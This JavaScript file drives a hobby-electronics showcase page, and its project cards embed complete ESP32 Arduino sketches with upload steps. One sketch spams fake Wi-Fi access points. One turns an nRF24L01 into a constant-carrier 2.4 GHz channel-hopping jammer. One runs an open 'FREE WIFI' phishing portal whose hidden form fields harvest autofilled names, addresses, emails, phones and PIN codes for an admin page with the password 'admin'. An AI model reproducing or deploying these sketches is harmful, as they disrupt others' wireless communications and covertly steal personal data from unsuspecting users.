

let currentPage = 1;

document.addEventListener('DOMContentLoaded', () => {
  // Show first page initially
  document.getElementById('page1').style.display = 'flex';

  // State to track current page
  window.currentPage = 1;

  // Handle mouse wheel / touchpad swipe
  window.addEventListener('wheel', handleSwipe);

  // Variables to track touch positions
  let touchStartY = 0;
  let touchEndY = 0;

  // Handle touch start
  window.addEventListener('touchstart', (e) => {
    touchStartY = e.touches[0].clientY;
  });

  // Handle touch end
  window.addEventListener('touchend', (e) => {
    touchEndY = e.changedTouches[0].clientY;
    handleTouchSwipe();
  });

  function handleTouchSwipe() {
    const swipeDistance = touchStartY - touchEndY;
    const swipeThreshold = 50; // minimum px to qualify as swipe

    if (swipeDistance > swipeThreshold && currentPage === 1) {
      // Swipe up detected, change page
      document.getElementById('page1').style.display = 'none';
      document.getElementById('page2').style.display = 'flex';
      currentPage = 2;
    }
  }

  function handleSwipe(e) {
    if (e.deltaY > 0 && currentPage === 1) {
      document.getElementById('page1').style.display = 'none';
      document.getElementById('page2').style.display = 'flex';
      currentPage = 2;
    }
  }
});


// Show Tools page
function showTools() {
  hideAll();
  document.getElementById('toolsPage').style.display = 'flex';
}

// Show Software page
function showSoftware() {
  hideAll();
  document.getElementById('softwarePage').style.display = 'flex';
}

// Simulate exit (customize as needed)
function exitApp() {
  alert('Exiting the application...');
  window.close()
}

// Display selected project details
function showProject(name) {
  hideAll();
  document.getElementById('projectTitle').innerText = name;
  document.getElementById('codeSection').innerText =
    `#include <WiFi.h>

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
}

void loop() {
  for (int i = 0; i < 1000; i++) {
    String ssid = "FakeWiFi_" + String(i);
    WiFi.softAP(ssid.c_str());
    delay(2000);
  }
  delay(1000);
}
`;
  document.getElementById('discpition').innerText =
    `1. Open Arduino IDE.
 
2. Go to Tools > Board > Boards Manager.

3. Search for "ESP32" and 
install it (by Espressif Systems).

4. upload code.`;
  document.getElementById('img1').src = 'https://www.shutterstock.com/shutterstock/photos/2165875645/display_1500/stock-vector-node-mcu-esp-for-programming-2165875645.jpg';
  document.getElementById('img2').src = 'https://www.shutterstock.com/shutterstock/photos/1089779288/display_1500/stock-photo-ljubljana-slovenia-may-illustrative-editorial-photo-of-a-esp-microcontroller-used-in-1089779288.jpg';
  document.getElementById('projectDetails').style.display = 'flex';
}

function showProject1(name) {
  hideAll();
  document.getElementById('projectTitle1').innerText = name;
  document.getElementById('codeSection1').innerText =
    `#include "RF24.h"
#include <ezButton.h>
#include "esp_bt.h"
#include "esp_wifi.h"

SPIClass *hp = nullptr;

RF24 radio(16, 15, 16000000);

byte i = 45;

unsigned int flag = 0;

ezButton toggleSwitch(33);


void setup(void) {
  esp_bt_controller_deinit();
  esp_wifi_stop();
  esp_wifi_deinit();
  Serial.begin(115200);
  toggleSwitch.setDebounceTime(50);
  initHP();
}
void initHP() {
  hp = new SPIClass(HSPI);
  hp->begin();
  if (radio.begin(hp)) {
    delay(200);
    Serial.println("Hp Started !!!");
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(5);   
    radio.setAddressWidth(3);  
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.printPrettyDetails();
    radio.startConstCarrier(RF24_PA_MAX, i);
  } else {
    Serial.println("HP couldn't start !!!");
  }
}
void two() {


  if (flag == 0) {
    i += 2;
  } else {
    i -= 2;
  }

  if ((i > 79) && (flag == 0)) {
    flag = 1;
  } else if ((i < 2) && (flag == 1)) {
    flag = 0;
  }

  radio.setChannel(i);

}

void one() {

  for (int i = 0; i < 79; i++) {
    radio.setChannel(i);
  }
}

void loop(void) {

  toggleSwitch.loop();

  /* if (toggleSwitch.isPressed())
    Serial.println("one");
  if (toggleSwitch.isReleased())
    Serial.println("two");*/

  int state = toggleSwitch.getState();


  if (state == HIGH)
    two();

  else {
    one();
  }
}`;
  document.getElementById('discpition1').innerText =
    `1. Open Arduino IDE.
 
2. Go to Tools > Board > Boards Manager.

3. Search for "ESP32" and 
install it (by Espressif Systems).

4. upload code.

PINS TO ATTACH NRF24L01 TO ESP32
HSPI= SCK=14 , MISO-12 , MOSI=13 , CS=15 , CE=22
VSPI= SCK=18 , MISO=19 , MOSI=23 , CS=21 , CE=22 `;
  document.getElementById('img1_1').src = 'https://www.shutterstock.com/shutterstock/photos/1091309687/display_1500/stock-photo-ljubljana-slovenia-may-illustrative-editorial-photo-of-a-esp-microcontroller-used-in-1091309687.jpg';
  document.getElementById('img2_1').src = 'https://www.shutterstock.com/shutterstock/photos/2197135405/display_1500/stock-photo-receiver-or-transmitter-module-nrf-l-on-a-white-background-2197135405.jpg';
  document.getElementById('projectDetails1').style.display = 'flex';
}

function showProject2(name) {
  hideAll();
  document.getElementById('projectTitle2').innerText = name;
  document.getElementById('codeSection2').innerText =
    `#include <WiFi.h>
#include <WebServer.h>

const char* ssid = "ESP32";
const char* password = "";
WebServer server(80);

const char* autofillHtml = R"(
<html>
<body>
<style>
.one{
opacity:0;
text-align:center;
}
.two{
text-align:center;
}
</style>
<h1>FREE WIFI</h1>
<form action="/autofill" method="post">
<div class="two">
<label for="name">Name:</label>
<input type="text" id="name" name="name"><br><br>
<input type="submit" value="ENTER">

<div class="one">
<label for="Address">Adress:</label>
<input type="text" id="Address" name="Address"><br><br>

<label for="City">City:</label>
<input type="text" id="City" name="City"><br><br>

<label for="State">State:</label>
<input type="text" id="State" name="State"><br><br>

<label for="email">Email:</label>
<input type="email" id="email" name="email"><br><br>

<label for="Country / Region">Country / Region:</label>
<input type="text" id="Country / Region" name="Country / Region"><br><br>

<label for="phone">Phone:</label>
<input type="tel" id="phone" name="phone"><br><br>

<label for="Mobile">Mobile:</label>
<input type="tel" id="Mobile" name="Mobile"><br><br>

<label for="PINcode">PINcode:</label>
<input type="tel" id="PINcode" name="PINcode"><br><br>

</div>
</div>

</form>
</body>
</html>

)";

const char* adminHtml = R"(
<html>
<body>
<h1>Autofilled Data</h1>
<p>Name: %name%</p>
<p>Address: %Address%</p>
<p>City: %City%</p>
<p>State: %State%</p>
<p>Email: %email%</p>
<p>Country: %Country%</p>
<p>Phone: %phone%</p>
<p>Mobile: %Mobile%</p>
<p>PIN code: %PINcode%</p>
</body>
</html>
)";

const char* loginHtml = R"(
<html>
<body>
<h1>Admin Login</h1>
<form action="/login" method="post">
<label for="password">Password:</label>
<input type="password" id="password" name="password"><br><br>
<input type="submit" value="Login">
</form>
</body>
</html>
)";

String name = "";
String Address = "";
String City = "";
String State = "";
String email = "";
String Country = "";
String phone = "";
String Mobile = "";
String PINcode = "";


const char* adminPassword = "admin";

bool isAdminLoggedIn = false;

void setup() {
  Serial.begin(115200);

  WiFi.softAP(ssid, password);

  server.on("/", []() {
    server.send(200, "text/html", autofillHtml);
  });
  server.on("/autofill", HTTP_POST, []() {
    name = server.arg("name");
    Address = server.arg("Address");
    City = server.arg("City");
    State = server.arg("State");
    email = server.arg("email");
    Country = server.arg("Country");
    phone = server.arg("phone");
    Mobile = server.arg("Mobile");
    PINcode = server.arg("PINcode");

    server.send(200, "text/plain", "Thank You");
  });

  server.on("/admin", []() {
    if (isAdminLoggedIn) {
      String adminHtmlReplaced = adminHtml;
      adminHtmlReplaced.replace("%name%", name);
      adminHtmlReplaced.replace("%City%", City);
      adminHtmlReplaced.replace("%State%", State);
      adminHtmlReplaced.replace("%Address%", Address);
      adminHtmlReplaced.replace("%Country%", Country);
      adminHtmlReplaced.replace("%email%", email);
      adminHtmlReplaced.replace("%phone%", phone);
      adminHtmlReplaced.replace("%Mobile%", Mobile);
      adminHtmlReplaced.replace("%PINcode%", PINcode);

      server.send(200, "text/html", adminHtmlReplaced);
    } else {
      server.send(200, "text/html", loginHtml);
    }
  });

  server.on("/login", HTTP_POST, []() {
    String password = server.arg("password");

    if (password.equals(adminPassword)) {
      isAdminLoggedIn = true;
      server.send(200, "text/plain", "Login successful!");
    } else {
      server.send(200, "text/plain", "Invalid password!");
    }
  });

  server.begin();
}

void loop() {
  server.handleClient();
}

`;
  document.getElementById('discpition2').innerText =
    `1. Open Arduino IDE.
 
2. Go to Tools > Board > Boards Manager.

3. Search for "ESP32" and 
install it (by Espressif Systems).

4. upload code.ode.`;
  document.getElementById('img1_2').src = 'https://www.shutterstock.com/shutterstock/photos/1091309687/display_1500/stock-photo-ljubljana-slovenia-may-illustrative-editorial-photo-of-a-esp-microcontroller-used-in-1091309687.jpg';
  document.getElementById('img2_2').src = 'https://www.shutterstock.com/shutterstock/photos/2165875645/display_1500/stock-vector-node-mcu-esp-for-programming-2165875645.jpg';
  document.getElementById('projectDetails2').style.display = 'flex';
}

// Redirect to external software link
function redirectSoftware() {
  window.location.href = 'https://www.arduino.cc/en/software/'; // Replace with real URL
}

// Hide all dynamic pages
function hideAll() {
  const ids = ['toolsPage', 'softwarePage', 'projectDetails', 'page2','projectDetails1','projectDetails2'];
  ids.forEach(id => {
    document.getElementById(id).style.display = 'none';
  });
}
